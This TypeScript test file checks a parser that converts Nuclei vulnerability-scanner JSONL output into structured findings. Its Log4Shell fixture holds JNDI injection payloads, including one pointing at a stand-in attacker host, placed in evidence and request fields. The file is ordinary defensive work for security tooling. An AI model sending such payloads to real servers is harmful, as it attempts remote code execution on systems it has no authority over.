/**
 * Tests: Nuclei JSONL Parser
 *
 * Tests parsing of Nuclei output into ScanEngineFinding.
 * Uses realistic Nuclei JSON output samples.
 */

import { describe, it, expect } from 'vitest';
import { parseLine, parseNucleiOutput } from '../nuclei-parser.ts';

// ─── Realistic Nuclei Output Samples ───────────────────────

const CRITICAL_FINDING = JSON.stringify({
  'template-id': 'cve-2021-44228',
  'template-path': '/home/user/nuclei-templates/http/cves/2021/CVE-2021-44228.yaml',
  'info': {
    name: 'Apache Log4j2 Remote Code Execution',
    author: ['pdlcm', 'sh'],
    severity: 'critical',
    description: 'Apache Log4j2 <=2.14.1 JNDI features...',
    reference: [
      'https://nvd.nist.gov/vuln/detail/CVE-2021-44228',
      'https://logging.apache.org/log4j/2.x/security.html',
    ],
    tags: ['cve', 'cve2021', 'rce', 'log4j', 'oast'],
    classification: {
      'cwe-id': ['CWE-917'],
      'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
      'cvss-score': 10.0,
    },
    remediation: 'Upgrade Log4j2 to version 2.17.1 or later.',
  },
  type: 'http',
  host: 'https://example.com',
  'matched-at': 'https://example.com/api/v1/login',
  'extracted-results': ['${jndi:ldap://attacker.com/a}'],
  request: 'GET /api/v1/login?test=${jndi:ldap://x} HTTP/1.1\nHost: example.com',
  response: 'HTTP/1.1 200 OK\nSet-Cookie: JSESSIONID=${jndi:ldap://x}',
  'curl-command': 'curl -s -k -X $METHOD "$URL"',
  'matcher-status': true,
  ip: '93.184.216.34',
  timestamp: '2026-01-15T10:30:00.123456789Z',
});

const HIGH_FINDING = JSON.stringify({
  'template-id': 'token-spray',
  info: {
    name: 'JWT Token Spray',
    severity: 'high',
    tags: ['jwt', 'auth'],
  },
  type: 'http',
  host: 'https://example.com',
  'matched-at': 'https://example.com/api/v1/users',
  'extracted-results': ['eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'],
});

const MEDIUM_FINDING = JSON.stringify({
  'template-id': 'missing-x-frame-options',
  info: {
    name: 'Missing X-Frame-Options Header',
    severity: 'medium',
    description: 'The X-Frame-Options header is not set.',
    tags: ['headers', 'misconfig'],
    classification: {
      'cwe-id': ['CWE-1021'],
      'cvss-score': 4.3,
    },
  },
  type: 'http',
  host: 'https://example.com',
  'matched-at': 'https://example.com/dashboard',
});

const INFO_FINDING = JSON.stringify({
  'template-id': 'tech-detect',
  info: {
    name: 'WAF Detection',
    severity: 'info',
    tags: ['tech', 'waf'],
  },
  type: 'http',
  host: 'https://example.com',
  'matched-at': 'https://example.com',
});

// ─── Tests ─────────────────────────────────────────────────

describe('NucleiParser', () => {
  describe('parseLine — basic parsing', () => {
    it('should parse a critical finding with all fields', () => {
      const seen = new Set<string>();
      const result = parseLine(CRITICAL_FINDING, seen);

      expect(result.skipped).toBe(false);
      expect(result.finding).not.toBeNull();

      const f = result.finding!;
      expect(f.title).toBe('Apache Log4j2 Remote Code Execution');
      expect(f.severity).toBe('critical');
      expect(f.cweId).toBe('CWE-917');
      expect(f.cvssScore).toBe(10.0);
      expect(f.cvssVector).toBe('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H');
      expect(f.templateId).toBe('cve-2021-44228');
      expect(f.location.url).toBe('https://example.com/api/v1/login');
      expect(f.location.path).toBe('/api/v1/login');
      expect(f.confidence).toBe(0.85);
    });

    it('should parse a high finding', () => {
      const seen = new Set<string>();
      const result = parseLine(HIGH_FINDING, seen);

      expect(result.finding!.severity).toBe('high');
      expect(result.finding!.title).toBe('JWT Token Spray');
    });

    it('should parse a medium finding', () => {
      const seen = new Set<string>();
      const result = parseLine(MEDIUM_FINDING, seen);

      expect(result.finding!.severity).toBe('medium');
      expect(result.finding!.cweId).toBe('CWE-1021');
      expect(result.finding!.cvssScore).toBe(4.3);
    });

    it('should parse an info finding', () => {
      const seen = new Set<string>();
      const result = parseLine(INFO_FINDING, seen);

      expect(result.finding!.severity).toBe('info');
    });
  });

  describe('parseLine — evidence', () => {
    it('should include extracted-results as evidence', () => {
      const seen = new Set<string>();
      const result = parseLine(CRITICAL_FINDING, seen);

      const evidence = result.finding!.evidence;
      const poc = evidence.find(e => e.type === 'proof_of_concept');
      expect(poc).toBeDefined();
      expect(poc!.content).toContain('${jndi:ldap://attacker.com/a}');
    });

    it('should include request/response as evidence', () => {
      const seen = new Set<string>();
      const result = parseLine(CRITICAL_FINDING, seen);

      const evidence = result.finding!.evidence;
      const rr = evidence.find(e => e.type === 'request_response_pair');
      expect(rr).toBeDefined();
      expect(rr!.content).toContain('--- REQUEST ---');
      expect(rr!.content).toContain('--- RESPONSE ---');
    });

    it('should include curl command as evidence', () => {
      const seen = new Set<string>();
      const result = parseLine(CRITICAL_FINDING, seen);

      const evidence = result.finding!.evidence;
      const curl = evidence.find(e => e.type === 'log' && e.content.includes('curl'));
      expect(curl).toBeDefined();
    });
  });

  describe('parseLine — references', () => {
    it('should extract references from template info', () => {
      const seen = new Set<string>();
      const result = parseLine(CRITICAL_FINDING, seen);

      const refs = result.finding!.references;
      expect(refs).toBeDefined();
      expect(refs!.length).toBeGreaterThanOrEqual(2);
      expect(refs).toContain('https://nvd.nist.gov/vuln/detail/CVE-2021-44228');
    });

    it('should generate NVD link from cve-id field', () => {
      const row = JSON.stringify({
        'template-id': 'test',
        info: { name: 'Test', severity: 'high' },
        'cve-id': 'CVE-2024-1234',
        host: 'https://example.com',
        'matched-at': 'https://example.com',
      });
      const seen = new Set<string>();
      const result = parseLine(row, seen);

      expect(result.finding!.references).toContain(
        'https://nvd.nist.gov/vuln/detail/CVE-2024-1234',
      );
    });
  });

  describe('parseLine — tags', () => {
    it('should extract tags from template info', () => {
      const seen = new Set<string>();
      const result = parseLine(CRITICAL_FINDING, seen);

      const tags = result.finding!.tags;
      expect(tags).toContain('cve');
      expect(tags).toContain('rce');
      expect(tags).toContain('log4j');
    });

    it('should add detection type as tag', () => {
      const seen = new Set<string>();
      const result = parseLine(CRITICAL_FINDING, seen);

      expect(result.finding!.tags).toContain('nuclei-http');
    });
  });

  describe('parseLine — deduplication', () => {
    it('should skip exact duplicates (same template-id + matched-at)', () => {
      const seen = new Set<string>();
      const result1 = parseLine(CRITICAL_FINDING, seen);
      const result2 = parseLine(CRITICAL_FINDING, seen);

      expect(result1.finding).not.toBeNull();
      expect(result2.finding).toBeNull();
      expect(result2.skipped).toBe(true);
      expect(result2.error).toBe('Duplicate');
    });

    it('should NOT deduplicate different matched-at URLs', () => {
      const row1 = JSON.stringify({
        'template-id': 'xss',
        info: { name: 'XSS', severity: 'high' },
        host: 'https://example.com',
        'matched-at': 'https://example.com/page1',
      });
      const row2 = JSON.stringify({
        'template-id': 'xss',
        info: { name: 'XSS', severity: 'high' },
        host: 'https://example.com',
        'matched-at': 'https://example.com/page2',
      });

      const seen = new Set<string>();
      const result1 = parseLine(row1, seen);
      const result2 = parseLine(row2, seen);

      expect(result1.finding).not.toBeNull();
      expect(result2.finding).not.toBeNull();
    });
  });

  describe('parseLine — edge cases', () => {
    it('should skip empty lines', () => {
      const seen = new Set<string>();
      const result = parseLine('', seen);
      expect(result.finding).toBeNull();
      expect(result.skipped).toBe(true);
    });

    it('should skip whitespace-only lines', () => {
      const seen = new Set<string>();
      const result = parseLine('   \n\t  ', seen);
      expect(result.finding).toBeNull();
      expect(result.skipped).toBe(true);
    });

    it('should skip invalid JSON', () => {
      const seen = new Set<string>();
      const result = parseLine('this is not json {{{', seen);
      expect(result.finding).toBeNull();
      expect(result.skipped).toBe(true);
      expect(result.error).toBe('Invalid JSON');
    });

    it('should skip lines without template-id', () => {
      const seen = new Set<string>();
      const result = parseLine(JSON.stringify({ host: 'https://example.com' }), seen);
      expect(result.finding).toBeNull();
      expect(result.skipped).toBe(true);
      expect(result.error).toBe('Missing template-id');
    });

    it('should handle missing info field gracefully', () => {
      const row = JSON.stringify({
        'template-id': 'test-template',
        host: 'https://example.com',
        'matched-at': 'https://example.com/page',
      });
      const seen = new Set<string>();
      const result = parseLine(row, seen);

      expect(result.finding).not.toBeNull();
      expect(result.finding!.title).toBe('test-template'); // Falls back to template-id.
      expect(result.finding!.severity).toBe('info'); // Default severity.
    });
  });

  describe('parseLine — severity normalization', () => {
    const cases: [string, string][] = [
      ['critical', 'critical'],
      ['high', 'high'],
      ['medium', 'medium'],
      ['moderate', 'medium'],
      ['warning', 'medium'],
      ['low', 'low'],
      ['info', 'info'],
      ['informational', 'info'],
      ['unknown', 'low'],
      ['INFO', 'info'],
      ['CRITICAL', 'critical'],
      ['  High  ', 'high'],
    ];

    it.each(cases)('should normalize "%s" -> "%s"', (input, expected) => {
      const row = JSON.stringify({
        'template-id': 'test',
        info: { name: 'Test', severity: input },
        host: 'https://example.com',
        'matched-at': 'https://example.com',
      });
      const seen = new Set<string>();
      const result = parseLine(row, seen);
      expect(result.finding!.severity).toBe(expected);
    });
  });

  describe('parseNucleiOutput — batch parsing', () => {
    it('should parse multi-line JSONL output', () => {
      const output = [CRITICAL_FINDING, HIGH_FINDING, MEDIUM_FINDING, INFO_FINDING].join('\n');
      const result = parseNucleiOutput(output);

      expect(result.findings).toHaveLength(4);
      expect(result.errors).toBe(0);
      expect(result.duplicates).toBe(0);
    });

    it('should count duplicates', () => {
      const output = [CRITICAL_FINDING, CRITICAL_FINDING, HIGH_FINDING].join('\n');
      const result = parseNucleiOutput(output);

      expect(result.findings).toHaveLength(2);
      expect(result.duplicates).toBe(1);
    });

    it('should count JSON errors', () => {
      const output = [CRITICAL_FINDING, 'not json', '', MEDIUM_FINDING, 'also not json'].join('\n');
      const result = parseNucleiOutput(output);

      expect(result.findings).toHaveLength(2);
      expect(result.errors).toBe(2);
    });

    it('should respect maxFindings', () => {
      const output = [CRITICAL_FINDING, HIGH_FINDING, MEDIUM_FINDING, INFO_FINDING].join('\n');
      const result = parseNucleiOutput(output, 2);

      expect(result.findings).toHaveLength(2);
    });

    it('should handle empty output', () => {
      const result = parseNucleiOutput('');
      expect(result.findings).toHaveLength(0);
    });
  });

  describe('parseLine — interaction (OAST)', () => {
    it('should include interaction data as evidence', () => {
      const row = JSON.stringify({
        'template-id': 'ssrf-oast',
        info: { name: 'SSRF via OAST', severity: 'high' },
        type: 'http',
        host: 'https://example.com',
        'matched-at': 'https://example.com/api/fetch',
        interaction: {
          protocol: 'dns',
          'interaction-id': 'abc123',
          request: 'INBOUND DNS: test.abc123.interactsh.com',
          response: 'RESOLVED: 1.2.3.4',
        },
      });
      const seen = new Set<string>();
      const result = parseLine(row, seen);

      const evidence = result.finding!.evidence;
      const oast = evidence.find(e => e.description?.includes('Out-of-band'));
      expect(oast).toBeDefined();
      expect(oast!.content).toContain('abc123');
    });
  });

  describe('parseLine — v2 compatibility (template-info field)', () => {
    it('should fallback to template-info when info is missing', () => {
      const row = JSON.stringify({
        'template-id': 'old-template',
        'template-info': {
          name: 'Old Template',
          severity: 'high',
          tags: ['legacy'],
        },
        type: 'http',
        host: 'https://example.com',
      });
      const seen = new Set<string>();
      const result = parseLine(row, seen);

      expect(result.finding!.title).toBe('Old Template');
      expect(result.finding!.severity).toBe('high');
      expect(result.finding!.tags).toContain('legacy');
    });
  });
});